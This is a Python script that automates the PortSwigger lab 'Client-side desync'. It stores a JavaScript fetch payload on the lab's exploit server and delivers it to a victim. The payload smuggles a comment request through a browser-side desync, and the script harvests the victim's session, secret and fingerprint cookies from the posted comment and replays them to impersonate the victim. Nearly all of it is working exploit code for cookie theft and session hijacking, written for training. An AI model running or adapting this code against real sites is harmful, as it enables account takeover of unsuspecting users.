# Client-side desync

# https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse


TIMEOUT = 5

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
		time.sleep(1)
		soup = BeautifulSoup(r.content, 'html.parser')
		csrf_input = soup.find("input", {'name':'csrf'})
		csrf = csrf_input['value']
		print('[+] Found CSRF Token:\t%s' % csrf)
		return csrf

def store_payload(s, url, payload, attacker):
	store_exploit_path = attacker
	store_exploit_data = {
			"formAction": "STORE",
			"urlIsHttps": "on",
			"responseFile": "/exploit",
			"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
			"responseBody": payload
	}
	r = s.post(store_exploit_path, data=store_exploit_data)
	time.sleep(1)
	deliver_exploit_data = {
			"formAction": "DELIVER_TO_VICTIM",
			"urlIsHttps": "on",
			"responseFile": "/exploit",
			"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
			"responseBody": payload
	}
	r = s.post(store_exploit_path, data=deliver_exploit_data)
	time.sleep(1)
	print('\n[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % store_exploit_path + store_exploit_data['responseFile'])
	return r

def build_payload(url, session, lab, csrf, i):
	length = 700 + (50 * i)
	print('\n[+] Build payload with Content-Length: %s' % str(length))

	payload_to_send = f"""<script>fetch('https://{url}', {{
		\tmethod: 'POST',
		\tbody: 'POST /en/post/comment HTTP/1.1\\r\\nHost: {url}\\r\\nCookie: session={session}; _lab_analytics={lab}\\r\\nContent-Length: {length}\\r\\nContent-Type: x-www-form-urlencoded\\r\\nConnection: keep-alive\\r\\n\\r\\ncsrf={csrf}&postId={i}&name=gwyo&email=gwyo@attacker.com&website=https://attacker.com&comment=',
		\tmode: 'cors',
		\tcredentials: 'include',
	}}).catch(() => {{
		\tfetch('https://{url}/capture-me', {{
		\tmode: 'no-cors',
		\tcredentials: 'include'
	}})
}})</script>"""
	return payload_to_send

def find_exploit_srv(r):
	if re.search(r"href='(.*)'>Go to exploit server", r.text):
		srv = re.search(r"href='(.*)'>Go to exploit server", r.text).group(1)
		print('[+] Found Exploit server:\n\t%s' % srv)
		return srv
	else:
		print("[-] Didn't find exploit server on the home page <!>")
		sys.exit(1)


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Client-side desync')
	parser = argparse.ArgumentParser(description="[+] Lab: Client-side desync")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	if parsed_url.port:
		port = parsed_url.port
	elif parsed_url.scheme == "https":
		port = 443
	elif parsed_url.scheme == "http":
		port = 80
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	try:
		r = s.get(url)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			exploit_srv = find_exploit_srv(r)
			time.sleep(1)
			attacker = urllib.parse.urlparse(exploit_srv).scheme + "://" + urllib.parse.urlparse(exploit_srv).netloc
			atk_url = urllib.parse.urlparse(attacker)
			print(atk_url)
			atk_domain = atk_url.netloc
			if atk_url.port:
				atk_port = atk_url.port
			elif atk_url.scheme == "https":
				atk_port = 443
			elif atk_url.scheme == "http":
				atk_port = 80
			r = requests.get(url + '/en/', proxies=proxies, verify=False)
			print(r)
			time.sleep(1)
			session = r.cookies.get_dict().get('session')
			lab = r.cookies.get_dict().get('_lab_analytics')
			print('[+] Found Session cookie:\t%s' % session)
			print('[+] Found Lab Analytics cookie:\t%s' % lab)
			print('[+] Trying craft HTTP Request attack to reveal cookies...\n')
			time.sleep(1)
			s.cookies.clear()
			cookies = {"session": session, "_lab_analytics": lab}
			r = s.get(f'{url}/en/post?postId=3', cookies=cookies)
			print(r)
			time.sleep(1)
			csrf = get_csrf_token(r)
			solved = None
			secret = None
			while solved is None:
				for i in range(1, 11):
					print("------------------------------------------------------")
					if i > 1:
						print("[+] Increasing the content-length of the /post/comment request in the payload...")
					payload = build_payload(host, session, lab, csrf, i)
					r = store_payload(s, host, payload, f'{atk_url.scheme}://{atk_domain}')
					time.sleep(TIMEOUT)
					r = s.get(url + '/en/post?postId=' + str(i))
					time.sleep(1)
					res = r.text
					if re.search('; secret=(.*);', res) and re.search('; session=(.*); ', res):
						fingerprint = re.search('victim-fingerprint=(.*); secret', res).group(1)
						secret = re.search('; secret=(.*); session', res).group(1)
						session = re.search('; session=(.*); ', res).group(1)
						print('[+] Found Fingerprint:\t%s' % fingerprint)
						print('[+] Found Secret:\t%s' % secret)
						print('[+] Found Session:\t%s' % session)
						solved = True
						break
				if secret:
					if len(secret) == len(session) == len(fingerprint):
						print('[+] Trying impersonate user with his cookies...\n')
						s.cookies.clear()
						cookies = {"victim-fingerprint": fingerprint, "session": session, "secret": secret}
						r = s.get(url + '/my-account', cookies=cookies)
			time.sleep(5)
			r = s.get(url)
			print(r)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)


if __name__ == "__main__":
	main()
